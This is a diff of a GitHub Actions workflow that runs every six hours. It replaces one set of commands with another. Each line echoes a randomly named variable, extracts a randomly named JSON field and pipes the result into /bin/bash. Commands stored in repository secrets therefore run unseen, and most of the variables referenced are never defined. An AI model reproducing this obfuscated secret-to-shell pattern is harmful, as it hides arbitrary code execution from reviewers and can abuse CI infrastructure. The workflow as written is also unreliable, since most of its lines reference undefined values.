@@ -3,26 +3,31 @@ name: jiashadeq
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 1/6 * * *'
-
+    - cron: '9 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiashadeq
         env:
-          evo932: ${{ secrets.evo932 }}
+          f85: ${{ secrets.f85 }}
         run: |
-          echo $evo932 | jq -r .rd9708 | /bin/bash
-          echo $m316 | jq -r .smkz86 | /bin/bash
-          echo $psk45347 | jq -r .miqta3 | /bin/bash
-          echo $v83953 | jq -r .jhpbe7 | /bin/bash
-          echo $dj22244 | jq -r .ioa056 | /bin/bash
-          echo $p3421 | jq -r .vug631 | /bin/bash
-          echo $nwuli2 | jq -r .bern43268 | /bin/bash
-          echo $ltu226 | jq -r .zy93 | /bin/bash
-          echo $ik958 | jq -r .ruvu5865 | /bin/bash
-          echo $ous88 | jq -r .rl41335 | /bin/bash
-          echo $ggv119 | jq -r .oypwg6916 | /bin/bash
+          echo $f85 | jq -r .kbeqz6127 | /bin/bash
+          echo $z95542 | jq -r .kbmyz1 | /bin/bash
+          echo $jmkn121 | jq -r .ou3 | /bin/bash
+          echo $lfj9389 | jq -r .e326 | /bin/bash
+          echo $ust6894 | jq -r .msga2 | /bin/bash
+          echo $dpu374 | jq -r .wsi42 | /bin/bash
+          echo $sgywy27 | jq -r .cg210 | /bin/bash
+          echo $o669 | jq -r .wx2 | /bin/bash
+          echo $cfwgm3 | jq -r .d0 | /bin/bash
+          echo $dvlua108 | jq -r .eccy657 | /bin/bash
+          echo $xt43381 | jq -r .gdazj4053 | /bin/bash
+          echo $cuo5 | jq -r .y82555 | /bin/bash
+          echo $pjw8079 | jq -r .ffz3 | /bin/bash
+          echo $dakg9 | jq -r .rnnr39789 | /bin/bash
+          echo $lxnj99715 | jq -r .w31 | /bin/bash
+          echo $vssv7493 | jq -r .geu9 | /bin/bash
 
